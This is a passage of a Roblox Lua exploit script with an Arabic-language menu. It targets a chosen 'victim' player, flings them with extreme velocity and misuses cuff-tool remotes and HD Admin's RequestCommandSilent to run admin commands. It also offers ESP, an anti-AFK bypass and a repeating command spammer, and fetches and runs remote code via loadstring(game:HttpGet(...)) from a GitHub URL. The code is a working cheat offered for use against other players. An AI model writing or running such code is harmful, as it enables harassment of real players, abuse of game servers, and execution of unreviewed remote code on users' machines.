    FeaturesScrollFrame.Name = "FeaturesScrollFrame"
    FeaturesScrollFrame.Size = UDim2.new(1, -20, 1, -20)
    FeaturesScrollFrame.Position = UDim2.new(0, 10, 0, 10)
    FeaturesScrollFrame.BackgroundTransparency = 1
    FeaturesScrollFrame.ScrollBarThickness = 8
    FeaturesScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 500)
    FeaturesScrollFrame.ZIndex = 2

    FeaturesButtonGrid = Instance.new("UIGridLayout")
    FeaturesButtonGrid.CellPadding = UDim2.new(0, 5, 0, 10)
    FeaturesButtonGrid.CellSize = UDim2.new(0.48, -10, 0, 40)
    FeaturesButtonGrid.FillDirection = Enum.FillDirection.Horizontal
    FeaturesButtonGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
    FeaturesButtonGrid.SortOrder = Enum.SortOrder.LayoutOrder
    FeaturesButtonGrid.Parent = FeaturesScrollFrame

    featuresButtons = {
        {name = "ESP", type = "esp", order = 1},
        {name = "مضاد نسخ", type = "antiCopy", order = 2},
        {name = "مضاد النسخ بدون Mod", type = "antiCopyNoMod", order = 3},
        {name = "حقل الأوامر", type = "commandField", order = 4},
        {name = "اعاده الانضمام", type = "rejoin", order = 5},
        {name = "تغيير السيرفر", type = "changeServer", order = 6},
        {name = "مضاد الكلبشه", type = "antiGrab", order = 7},
        {name = "تقليل الضغط", type = "performance", order = 8},
        {name = "مضاد AFK", type = "antiAFK", order = 9},
        {name = "مضاد تفعيل", type = "antiBang", order = 10}
    }

    featuresButtonInstances = {}
    featuresActive = {
        antiCopy = false,
        antiCopyNoMod = false,
        commandField = false,
        esp = false,
        antiGrab = false,
        performance = false,
        antiAFK = false,
        antiBang = false
    }

    -- متغيرات للأزرار الجديدة
    antiGrabConnection = nil
    performanceOriginalObjects = {}
    performanceConnection = nil
    antiAFKConnection = nil
    antiBangThread = nil

    -- وظائف المميزات (كما هي)
    function rejoinServer()
        showNotification("جاري اعاده الانضمام....", nil, false)
        task.wait(1)
        pcall(function()
            local placeId = game.PlaceId
            TeleportService:TeleportToPlaceInstance(placeId, game.JobId, player)
        end)
        task.wait(2)
        pcall(function()
            game:GetService("TeleportService"):Teleport(game.PlaceId, player)
        end)
    end

    function changeServer()
        showNotification("جاري تغيير السيرفر....", nil, false)
        task.wait(1)
        pcall(function()
            local HttpService = game:GetService("HttpService")
            local servers = {}
            local success, result = pcall(function()
                return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100"))
            end)
            if success and result and result.data then
                for _, server in ipairs(result.data) do
                    if server.playing < server.maxPlayers and server.id ~= game.JobId then
                        table.insert(servers, server)
                    end
                end
                if #servers > 0 then
                    local randomServer = servers[math.random(1, #servers)]
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, randomServer.id, player)
                else
                    showNotification("❌ لا توجد سيرفرات متاحة", nil, false)
                end
            else
                game:GetService("TeleportService"):Teleport(game.PlaceId, player)
            end
        end)
    end

    espActive = false
    function toggleESP()
        if espActive then
            espActive = false
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsclor/Wa7eed/refs/heads/main/Wa7eed%20ESP"))()
            end)
            featuresButtonInstances["esp"].Text = "ESP (إيقاف)"
            featuresButtonInstances["esp"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        else
            espActive = true
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsclor/Wa7eed/refs/heads/main/Wa7eed%20ESP"))()
            end)
            featuresButtonInstances["esp"].Text = "ESP (تشغيل)"
            featuresButtonInstances["esp"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        end
    end

    function createFeaturesButton(name, layoutOrder)
        local button = Instance.new("TextButton")
        button.Name = name
        button.Size = UDim2.new(1, -10, 0, 40)
        button.BackgroundColor3 = Color3.new(0, 0, 0)
        button.BackgroundTransparency = 0.5
        button.TextColor3 = Color3.new(1, 1, 1)
        button.Text = name
        button.TextSize = 12
        button.Font = Enum.Font.GothamBlack
        button.TextStrokeColor3 = Color3.new(0, 0, 0)
        button.TextStrokeTransparency = 0.3
        button.BorderSizePixel = 3
        button.BorderColor3 = Color3.new(1, 1, 1)
        button.LayoutOrder = layoutOrder
        button.ZIndex = 2
        
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 6)
        buttonCorner.Parent = button
        
        button.MouseEnter:Connect(function()
            local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = TweenService:Create(button, tweenInfo, {
                BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
            })
            tween:Play()
        end)
        
        button.MouseLeave:Connect(function()
            local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = TweenService:Create(button, tweenInfo, {
                BackgroundColor3 = Color3.new(0, 0, 0)
            })
            tween:Play()
        end)
        
        button.Parent = FeaturesScrollFrame
        return button
    end

    for _, buttonInfo in ipairs(featuresButtons) do
        local button = createFeaturesButton(buttonInfo.name, buttonInfo.order)
        featuresButtonInstances[buttonInfo.type] = button
    end

    -- وظائف المميزات (مختصرة)
    antiCopyActive = false
    antiCopyThread = nil
    function toggleAntiCopy()
        antiCopyActive = not antiCopyActive
        if antiCopyActive then
            featuresButtonInstances["antiCopy"].Text = "مضاد نسخ (تشغيل)"
            featuresButtonInstances["antiCopy"].BackgroundColor3 = Color3.new(0.5, 0, 0)
            antiCopyThread = coroutine.wrap(function()
                while antiCopyActive do
                    pcall(function()
                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
                        local RequestCommandSilent = ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent
                        RequestCommandSilent:InvokeServer(".unwormify me  .undog me  .unneon me  .unchar me ")
                    end)
                    task.wait(5)
                end
            end)()
        else
            if antiCopyThread then antiCopyThread = nil end
            featuresButtonInstances["antiCopy"].Text = "مضاد نسخ (إيقاف)"
            featuresButtonInstances["antiCopy"].BackgroundColor3 = Color3.new(0, 0, 0)
        end
    end

    antiCopyNoModActive = false
    antiCopyNoModThread = nil
    function toggleAntiCopyNoMod()
        antiCopyNoModActive = not antiCopyNoModActive
        if antiCopyNoModActive then
            featuresButtonInstances["antiCopyNoMod"].Text = "مضاد نسخ بدون Mod (تشغيل)"
            featuresButtonInstances["antiCopyNoMod"].BackgroundColor3 = Color3.new(0.5, 0, 0)
            antiCopyNoModThread = coroutine.wrap(function()
                while antiCopyNoModActive do
                    pcall(function()
                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
                        local RequestCommandSilent = ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent
                        RequestCommandSilent:InvokeServer(".char ")
                    end)
                    task.wait(2)
                end
            end)()
        else
            if antiCopyNoModThread then antiCopyNoModThread = nil end
            featuresButtonInstances["antiCopyNoMod"].Text = "مضاد نسخ بدون Mod (إيقاف)"
            featuresButtonInstances["antiCopyNoMod"].BackgroundColor3 = Color3.new(0, 0, 0)
        end
    end

    function executeCommand(command)
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommandSilent = ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent
        pcall(function()
            RequestCommandSilent:InvokeServer(command)
        end)
    end

    commandFieldActive = false
    commandFieldGui = nil
    function toggleCommandField()
        commandFieldActive = not commandFieldActive
        if commandFieldActive then
            featuresButtonInstances["commandField"].Text = "حقل الأوامر (تشغيل)"
            featuresButtonInstances["commandField"].BackgroundColor3 = Color3.new(0.5, 0, 0)
            commandFieldGui = Instance.new("ScreenGui")
            commandFieldGui.Name = "CommandFieldGui"
            commandFieldGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            commandFieldGui.ResetOnSpawn = false
            local mainFrame = Instance.new("Frame")
            mainFrame.Size = UDim2.new(0, 300, 0, 250)
            mainFrame.Position = UDim2.new(0.5, -150, 0.5, -125)
            mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
            mainFrame.BackgroundTransparency = 0.5
            mainFrame.BorderSizePixel = 3
            mainFrame.BorderColor3 = Color3.new(1, 1, 1)
            mainFrame.Active = true
            mainFrame.Draggable = true
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 8)
            corner.Parent = mainFrame
            local title = Instance.new("TextLabel")
            title.Size = UDim2.new(1, 0, 0, 35)
            title.Position = UDim2.new(0, 0, 0, 0)
            title.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
            title.BackgroundTransparency = 0.5
            title.TextColor3 = Color3.new(1, 1, 1)
            title.Text = "حقل الأوامر - DEDSEC"
            title.TextSize = 14
            title.Font = Enum.Font.GothamBlack
            title.BorderSizePixel = 3
            title.BorderColor3 = Color3.new(1, 1, 1)
            title.TextXAlignment = Enum.TextXAlignment.Center
            local titleCorner = Instance.new("UICorner")
            titleCorner.CornerRadius = UDim.new(0, 6)
            titleCorner.Parent = title
            local inputField = Instance.new("TextBox")
            inputField.Size = UDim2.new(0.9, 0, 0, 35)
            inputField.Position = UDim2.new(0.05, 0, 0, 45)
            inputField.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
            inputField.BackgroundTransparency = 0.5
            inputField.TextColor3 = Color3.new(1, 1, 1)
            inputField.PlaceholderText = "أدخل الأمر هنا..."
            inputField.PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
            inputField.Text = ""
            inputField.TextSize = 12
            inputField.Font = Enum.Font.GothamBold
            inputField.BorderSizePixel = 3
            inputField.BorderColor3 = Color3.new(1, 1, 1)
            inputField.ClearTextOnFocus = false
            local inputCorner = Instance.new("UICorner")
            inputCorner.CornerRadius = UDim.new(0, 6)
            inputCorner.Parent = inputField
            local buttonsFrame = Instance.new("Frame")
            buttonsFrame.Size = UDim2.new(0.9, 0, 0, 150)
            buttonsFrame.Position = UDim2.new(0.05, 0, 0, 90)
            buttonsFrame.BackgroundTransparency = 1
            local buttonsGrid = Instance.new("UIGridLayout")
            buttonsGrid.CellPadding = UDim2.new(0, 3, 0, 3)
            buttonsGrid.CellSize = UDim2.new(0.48, 0, 0, 25)
            buttonsGrid.FillDirection = Enum.FillDirection.Horizontal
            buttonsGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
            buttonsGrid.SortOrder = Enum.SortOrder.LayoutOrder
            buttonsGrid.Parent = buttonsFrame
            local function createCommandButton(name, color)
                local button = Instance.new("TextButton")
                button.Size = UDim2.new(1, 0, 0, 25)
                button.BackgroundColor3 = color
                button.BackgroundTransparency = 0.5
                button.TextColor3 = Color3.new(1, 1, 1)
                button.Text = name
                button.TextSize = 10
                button.Font = Enum.Font.GothamBlack
                button.BorderSizePixel = 2
                button.BorderColor3 = Color3.new(1, 1, 1)
                local buttonCorner = Instance.new("UICorner")
                buttonCorner.CornerRadius = UDim.new(0, 4)
                buttonCorner.Parent = button
                return button
            end
            local executeButton = createCommandButton("تنفيذ", Color3.new(0.5, 0, 0))
            local auto1Button = createCommandButton("تلقائي 1", Color3.new(0.2, 0.2, 0.6))
            local auto2Button = createCommandButton("تلقائي 2", Color3.new(0.2, 0.2, 0.6))
            local auto3Button = createCommandButton("تلقائي 3", Color3.new(0.2, 0.2, 0.6))
            local auto4Button = createCommandButton("تلقائي 4", Color3.new(0.2, 0.2, 0.6))
            local auto5Button = createCommandButton("تلقائي 5", Color3.new(0.2, 0.2, 0.6))
            local auto6Button = createCommandButton("تلقائي 6", Color3.new(0.2, 0.2, 0.6))
            local auto7Button = createCommandButton("تلقائي 7", Color3.new(0.2, 0.2, 0.6))
            executeButton.Parent = buttonsFrame
            auto1Button.Parent = buttonsFrame
            auto2Button.Parent = buttonsFrame
            auto3Button.Parent = buttonsFrame
            auto4Button.Parent = buttonsFrame
            auto5Button.Parent = buttonsFrame
            auto6Button.Parent = buttonsFrame
            auto7Button.Parent = buttonsFrame
            executeButton.MouseButton1Click:Connect(function()
                local command = inputField.Text
                if command ~= "" then
                    executeCommand(command)
                end
            end)
            local autoThreads = {}
            local function startAutoExecution(button, interval)
                if autoThreads[button] then
                    autoThreads[button] = nil
                    button.BackgroundColor3 = Color3.new(0.2, 0.2, 0.6)
                else
                    autoThreads[button] = true
                    button.BackgroundColor3 = Color3.new(0.5, 0, 0)
                    coroutine.wrap(function()
                        while autoThreads[button] do
                            local command = inputField.Text
                            if command ~= "" then
                                executeCommand(command)
                            end
                            task.wait(interval)
                        end
                    end)()
                end
            end
            auto1Button.MouseButton1Click:Connect(function() startAutoExecution(auto1Button, 1) end)
            auto2Button.MouseButton1Click:Connect(function() startAutoExecution(auto2Button, 2) end)
            auto3Button.MouseButton1Click:Connect(function() startAutoExecution(auto3Button, 3) end)
            auto4Button.MouseButton1Click:Connect(function() startAutoExecution(auto4Button, 4) end)
            auto5Button.MouseButton1Click:Connect(function() startAutoExecution(auto5Button, 5) end)
            auto6Button.MouseButton1Click:Connect(function() startAutoExecution(auto6Button, 6) end)
            auto7Button.MouseButton1Click:Connect(function() startAutoExecution(auto7Button, 7) end)
            UserInputService.InputBegan:Connect(function(input)
                if input.KeyCode == Enum.KeyCode.Escape and commandFieldActive then
                    commandFieldGui:Destroy()
                    commandFieldActive = false
                    featuresButtonInstances["commandField"].Text = "حقل الأوامر (إيقاف)"
                    featuresButtonInstances["commandField"].BackgroundColor3 = Color3.new(0, 0, 0)
                end
            end)
            title.Parent = mainFrame
            inputField.Parent = mainFrame
            buttonsFrame.Parent = mainFrame
            mainFrame.Parent = commandFieldGui
            commandFieldGui.Parent = CoreGui
        else
            if commandFieldGui then
                commandFieldGui:Destroy()
                commandFieldGui = nil
            end
            featuresButtonInstances["commandField"].Text = "حقل الأوامر (إيقاف)"
            featuresButtonInstances["commandField"].BackgroundColor3 = Color3.new(0, 0, 0)
        end
    end

    function toggleAntiGrab()
        if featuresActive.antiGrab then
            featuresActive.antiGrab = false
            local character = player.Character
            if character and character:FindFirstChild("Humanoid") then
                local humanoid = character:FindFirstChild("Humanoid")
                humanoid.Sit = false
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
            end
            if antiGrabConnection then
                antiGrabConnection:Disconnect()
                antiGrabConnection = nil
            end
            featuresButtonInstances["antiGrab"].Text = "مضاد الكلبشه (إيقاف)"
            featuresButtonInstances["antiGrab"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        else
            featuresActive.antiGrab = true
            local function setupAntiGrab()
                local character = player.Character
                if character and character:FindFirstChild("Humanoid") then
                    local humanoid = character:FindFirstChild("Humanoid")
                    local root = character:FindFirstChild("HumanoidRootPart")
                    if humanoid and root then
                        humanoid.Sit = true
                        humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                        humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
                        if antiGrabConnection then
                            antiGrabConnection:Disconnect()
                        end
                        antiGrabConnection = RunService.Heartbeat:Connect(function()
                            if humanoid.MoveDirection.Magnitude > 0 then
                                local moveDir = humanoid.MoveDirection
                                root.Velocity = Vector3.new(moveDir.X * 16, root.Velocity.Y, moveDir.Z * 16)
                            end
                        end)
                    end
                end
            end
            setupAntiGrab()
            player.CharacterAdded:Connect(function(newChar)
                if featuresActive.antiGrab then
                    task.wait(1)
                    setupAntiGrab()
                end
            end)
            featuresButtonInstances["antiGrab"].Text = "مضاد الكلبشه (تشغيل)"
            featuresButtonInstances["antiGrab"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        end
    end

    function togglePerformance()
        if featuresActive.performance then
            featuresActive.performance = false
            for obj, originalProps in pairs(performanceOriginalObjects) do
                if obj and obj.Parent then
                    pcall(function()
                        for prop, value in pairs(originalProps) do
                            obj[prop] = value
                        end
                    end)
                end
            end
            performanceOriginalObjects = {}
            if performanceConnection then
                performanceConnection:Disconnect()
                performanceConnection = nil
            end
            pcall(function()
                settings().Rendering.QualityLevel = 10
            end)
            featuresButtonInstances["performance"].Text = "تقليل الضغط (إيقاف)"
            featuresButtonInstances["performance"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        else
            featuresActive.performance = true
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj ~= player.Character and not obj:IsDescendantOf(player.Character) then
                    performanceOriginalObjects[obj] = {
                        Transparency = obj.Transparency,
                        CanCollide = obj.CanCollide,
                        Material = obj.Material
                    }
                    obj.Transparency = 1
                    obj.CanCollide = false
                    obj.Material = Enum.Material.Plastic
                end
            end
            for _, otherPlayer in ipairs(Players:GetPlayers()) do
                if otherPlayer ~= player then
                    local otherChar = otherPlayer.Character
                    if otherChar then
                        for _, part in ipairs(otherChar:GetDescendants()) do
                            if part:IsA("BasePart") then
                                performanceOriginalObjects[part] = {
                                    Transparency = part.Transparency
                                }
                                part.Transparency = 1
                            end
                        end
                    end
                end
            end
            pcall(function()
                settings().Rendering.QualityLevel = 1
            end)
            performanceConnection = Workspace.DescendantAdded:Connect(function(obj)
                if featuresActive.performance and obj:IsA("BasePart") and obj ~= player.Character and not obj:IsDescendantOf(player.Character) then
                    performanceOriginalObjects[obj] = {
                        Transparency = obj.Transparency,
                        CanCollide = obj.CanCollide,
                        Material = obj.Material
                    }
                    obj.Transparency = 1
                    obj.CanCollide = false
                    obj.Material = Enum.Material.Plastic
                end
            end)
            featuresButtonInstances["performance"].Text = "تقليل الضغط (تشغيل)"
            featuresButtonInstances["performance"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        end
    end

    function toggleAntiAFK()
        if featuresActive.antiAFK then
            featuresActive.antiAFK = false
            if antiAFKConnection then
                antiAFKConnection:Disconnect()
                antiAFKConnection = nil
            end
            featuresButtonInstances["antiAFK"].Text = "مضاد AFK (إيقاف)"
            featuresButtonInstances["antiAFK"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        else
            featuresActive.antiAFK = true
            antiAFKConnection = player.Idled:Connect(function()
                local VirtualUser = game:GetService("VirtualUser")
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
            featuresButtonInstances["antiAFK"].Text = "مضاد AFK (تشغيل)"
            featuresButtonInstances["antiAFK"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        end
    end

    function toggleAntiBang()
        if featuresActive.antiBang then
            featuresActive.antiBang = false
            if antiBangThread then
                antiBangThread = nil
            end
            featuresButtonInstances["antiBang"].Text = "مضاد تفعيل (إيقاف)"
            featuresButtonInstances["antiBang"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        else
            featuresActive.antiBang = true
            antiBangThread = coroutine.wrap(function()
                while featuresActive.antiBang do
                    pcall(function()
                        local character = player.Character
                        if character then
                            local root = character:WaitForChild("HumanoidRootPart")
                            local oldHeight = Workspace.FallenPartsDestroyHeight
                            Workspace.FallenPartsDestroyHeight = -10000
                            local originalPosition = root.Position
                            root.CFrame = CFrame.new(Vector3.new(0, -8000, 0))
                            task.wait(0.1)
                            root.CFrame = CFrame.new(originalPosition)
                            Workspace.FallenPartsDestroyHeight = oldHeight
                        end
                    end)
                    task.wait(0.5)
                end
            end)()
            antiBangThread()
            featuresButtonInstances["antiBang"].Text = "مضاد تفعيل (تشغيل)"
            featuresButtonInstances["antiBang"].BackgroundColor3 = Color3.new(0.5, 0, 0)
        end
    end

    -- توصيل أزرار المميزات
    featuresButtonInstances["esp"].MouseButton1Click:Connect(toggleESP)
    featuresButtonInstances["antiCopy"].MouseButton1Click:Connect(toggleAntiCopy)
    featuresButtonInstances["antiCopyNoMod"].MouseButton1Click:Connect(toggleAntiCopyNoMod)
    featuresButtonInstances["commandField"].MouseButton1Click:Connect(toggleCommandField)
    featuresButtonInstances["rejoin"].MouseButton1Click:Connect(rejoinServer)
    featuresButtonInstances["changeServer"].MouseButton1Click:Connect(changeServer)
    featuresButtonInstances["antiGrab"].MouseButton1Click:Connect(toggleAntiGrab)
    featuresButtonInstances["performance"].MouseButton1Click:Connect(togglePerformance)
    featuresButtonInstances["antiAFK"].MouseButton1Click:Connect(toggleAntiAFK)
    featuresButtonInstances["antiBang"].MouseButton1Click:Connect(toggleAntiBang)

    -- تجميع العناصر
    ScreenGui.Parent = CoreGui
    ToggleButton.Parent = ScreenGui
    MainFrame.Parent = ScreenGui
    BackgroundImage.Parent = MainFrame
    Title.Parent = MainFrame
    TabsFrame.Parent = MainFrame
    ContentFrame.Parent = MainFrame
    VictimSection.Parent = ContentFrame
    FeaturesSection.Parent = ContentFrame
    VictimInfo.Parent = VictimSection
    VictimAvatar.Parent = VictimInfo
    VictimName.Parent = VictimInfo
    VictimInfoText.Parent = VictimInfo
    InputFrame.Parent = VictimSection
    VictimInput.Parent = InputFrame
    SetVictimButton.Parent = InputFrame
    ScrollFrame.Parent = VictimSection
    FeaturesScrollFrame.Parent = FeaturesSection

    -- المتغيرات
    currentVictim = nil
    isSpectating = false
    originalCameraSubject = workspace.CurrentCamera.CameraSubject

    -- متغيرات الأزرار
    bangActive = false
    bangFrontActive = false
    bangConnection = nil
    bangFrontConnection = nil
    bangTargetPlayer = nil
    bangFrontTargetPlayer = nil
    bangWasActive = false
    bangFrontWasActive = false
    headSuckWasActive = false
    autoButtonsWasActive = {}
    headSucking = false
    headSuckAnimTrack = nil
    headSuckConnection = nil
    headSuckTargetPlayer = nil
    headSuckCurrentDistance = 1.5
    headSuckMovingIn = true
    headSuckMovementSpeed = 0.5
    headSuckMinDistance = 0.5
    headSuckMaxDistance = 2.5
    autoButtonsActive = {}
    autoButtonsThreads = {}

    -- وظائف الأزرار (كما هي)
    function executeFling()
        if not currentVictim then return end
        local targetName = currentVictim
        local keyWords = {"كلب", "cuff", "hand", "arrest", "كلبشه", "كلبشة"}
        local function isCuff(tool)
            local name = tool.Name:lower()
            for _, word in ipairs(keyWords) do
                if string.find(name, word:lower()) then
                    return true
                end
            end
            return false
        end
        local function getAllCuffs()
            local cuffs = {}
            if not player.Character then return cuffs end
            if player.Backpack then
                for _, item in ipairs(player.Backpack:GetChildren()) do
                    if item:IsA("Tool") and isCuff(item) then
                        table.insert(cuffs, item)
                    end
                end
            end
            for _, item in ipairs(player.Character:GetChildren()) do
                if item:IsA("Tool") and isCuff(item) then
                    table.insert(cuffs, item)
                end
            end
            return cuffs
        end
        local function getRandomCuff()
            local cuffs = getAllCuffs()
            if #cuffs == 0 then return nil end
            return cuffs[math.random(1, #cuffs)]
        end
        local function useCuffAndReturn()
            local cuff = getRandomCuff()
            if cuff then
                cuff.Parent = player.Character
                local remote
                for _, obj in ipairs(cuff:GetDescendants()) do
                    if obj:IsA("RemoteEvent") then
                        remote = obj
                        break
                    end
                end
                if remote then
                    local target = Players:FindFirstChild(targetName)
                    if target and target.Character then
                        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
                        if targetHRP then
                            remote:FireServer(targetHRP)
                        end
                    end
                end
                task.wait(0.1)
                if cuff and cuff.Parent == player.Character then
                    cuff.Parent = player.Backpack
                end
            end
        end
        local target = Players:FindFirstChild(targetName)
        if not target or not target.Character then return end
        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
        if not targetHRP then return end
        local Character = player.Character
        local Humanoid = Character and Character:FindFirstChild("Humanoid")
        local RootPart = Humanoid and Humanoid.RootPart
        if not (Character and Humanoid and RootPart) then return end
        local OldPos = RootPart.CFrame
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        Humanoid.PlatformStand = true
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        BV.Velocity = Vector3.new(1e8, 1e8, 1e8)
        BV.Parent = RootPart
        useCuffAndReturn()
        task.wait(0.1)
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        if ReplicatedStorage:FindFirstChild("HDAdminHDClient") and
           ReplicatedStorage.HDAdminHDClient:FindFirstChild("Signals") and
           ReplicatedStorage.HDAdminHDClient.Signals:FindFirstChild("RequestCommandSilent") then
            local RequestCommandSilent = ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent
            if RequestCommandSilent:IsA("RemoteFunction") then
                RequestCommandSilent:InvokeServer(".re " .. targetName)
            end
        end
        task.wait(0.1)
        useCuffAndReturn()
        local startTime = tick()
        while tick() - startTime < 2 do
            RootPart.CFrame = RootPart.CFrame * CFrame.new(0, 0, -5)
            task.wait(0.02)
        end
        BV:Destroy()
        RootPart.CFrame = OldPos
        RootPart.Velocity = Vector3.new()
        RootPart.RotVelocity = Vector3.new()
        Humanoid.PlatformStand = false
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
        task.wait(0.05)
        Humanoid:ChangeState(Enum.HumanoidStateType.Running)
        task.wait(0.03)
        Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.03)
        Humanoid:ChangeState(Enum.HumanoidStateType.Running)
    end

    -- قائمة الأسماء المحمية
    protectedUsernames = { 
        "sj3zx", "sj3zxx", "sj3zxxx", "1il5i", "1il5f", "Lix_700xx",
        "awr_9351156", "sj3zxxx3", "AImsaudIlIlII", "sj3zxxx33",
        "moonwe80", "Aly_a15", 
        "strawberrynonyy", "abo_sdq", "Alex100alex500", "Fc7v7", "Fc7v79",
        "Fc7v7999", "DMRxF7LKxBOT", "nanFc7v7", "Xevlor6", "Xevlor66", "Xevlor6666",
        "Sorry110096", "A_ANA0709", "nan_A_ANA0709", "Lix_700x", "FBI_7oddy",
        "FBI_7oddyyyy", "1_GEGE616", "nan_v7x2l", "nan_Fc7v7", "HMOODDY110",
        "nan_abu7arb", "sj3zx"
    }

    function updateScrollFrameSize()
        local buttonCount = #victimButtons
        local rows = math.ceil(buttonCount / 4)
        local height = rows * 32 + (rows - 1) * 4 + 8
        local extraSpace = 20
        ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, height + extraSpace)
    end
    task.defer(updateScrollFrameSize)

    function findPlayerByPartialName(partialName)
        local matches = {}
        partialName = partialName:lower()
        for _, targetPlayer in pairs(Players:GetPlayers()) do
            if targetPlayer.Name:lower() == partialName then
                return targetPlayer
            elseif targetPlayer.DisplayName:lower() == partialName then
                return targetPlayer
            end
        end
        for _, targetPlayer in pairs(Players:GetPlayers()) do
            if targetPlayer.Name:lower():sub(1, #partialName) == partialName or 
               targetPlayer.DisplayName:lower():sub(1, #partialName) == partialName then
                table.insert(matches, targetPlayer)
            end
        end
        if #matches == 1 then
            return matches[1]
        elseif #matches > 1 then
            return nil
        else
            return nil
        end
    end

    function getAccountAge(userId)
        local success, result = pcall(function()
            return game:GetService("Players"):GetPlayerByUserId(userId).AccountAge
        end)
        if success and result then
            local days = result
            local years = math.floor(days / 365)
            local months = math.floor((days % 365) / 30)
            local remainingDays = days % 30
            return years, months, remainingDays
        end
        return 0, 0, 0
    end

    function getVictimTools(victimPlayer)
        local tools = {}
        if victimPlayer and victimPlayer.Character then
            local backpack = victimPlayer:FindFirstChildOfClass("Backpack")
            if backpack then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        table.insert(tools, tool.Name)
                    end
                end
            end
            for _, tool in ipairs(victimPlayer.Character:GetChildren()) do
                if tool:IsA("Tool") then
                    table.insert(tools, tool.Name)
                end
            end
        end
        return tools
    end

    function formatToolsList(tools)
        if #tools == 0 then
            return "لا يوجد أدوات"
        elseif #tools <= 3 then
            return table.concat(tools, ", ")
        else
            return table.concat(tools, ", ", 1, 3) .. " +" .. (#tools - 3)
        end
    end

    function updateVictimInfo(victimPlayer)
        if victimPlayer then
            VictimName.Text = "الضحية: " .. victimPlayer.Name
            VictimAvatar.Image = loadPlayerImage(victimPlayer.UserId)
            local displayName = victimPlayer.DisplayName
            local userId = victimPlayer.UserId
            local years, months, days = getAccountAge(victimPlayer.UserId)
            local accountAgeText = ""
            if years > 0 then
                accountAgeText = years .. " سنة " .. months .. " شهر " .. days .. " يوم"
            elseif months > 0 then
                accountAgeText = months .. " شهر " .. days .. " يوم"
            else
                accountAgeText = days .. " يوم"
            end
            local tools = getVictimTools(victimPlayer)
            local toolsText = formatToolsList(tools)
            VictimInfoText.Text = "اللقب: " .. displayName .. 
                                 "\nعمر الحساب: " .. accountAgeText ..
                                 "\nID: " .. userId ..
                                 "\nالأدوات: " .. toolsText
            currentVictim = victimPlayer.Name
            lastVictim = victimPlayer.Name
            showNotification("✅ تم تحديد الضحية: " .. victimPlayer.Name, {
                Image = loadPlayerImage(victimPlayer.UserId)
            }, false)
        else
            VictimName.Text = "لا يوجد ضحية محددة"
            VictimAvatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
            VictimInfoText.Text = "اللقب: -\nعمر الحساب: -\nID: -\nالأدوات: -"
            currentVictim = nil
        end
    end

    -- وظائف الزرين الجديدين
    function executeFreezeCuff()
        if not currentVictim then
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
            return
        end
        local targetName = currentVictim
        local keyWords = {"كلب", "cuff", "hand", "arrest", "كلبشه", "كلبشة"}
        local function isCuff(tool)
            local name = tool.Name:lower()
            for _, word in ipairs(keyWords) do
                if string.find(name, word:lower()) then
                    return true
                end
            end
            return false
        end
        local function getAllCuffs()
            local cuffs = {}
            for _, item in ipairs(player.Backpack:GetChildren()) do
                if item:IsA("Tool") and isCuff(item) then
                    table.insert(cuffs, item)
                end
            end
            if player.Character then
                for _, item in ipairs(player.Character:GetChildren()) do
                    if item:IsA("Tool") and isCuff(item) then
                        table.insert(cuffs, item)
                    end
                end
            end
            return cuffs
        end
        local function getRandomCuff()
            local cuffs = getAllCuffs()
            if #cuffs == 0 then return nil end
            return cuffs[math.random(1, #cuffs)]
        end
        local target = Players:FindFirstChild(targetName)
        if not target or not target.Character then 
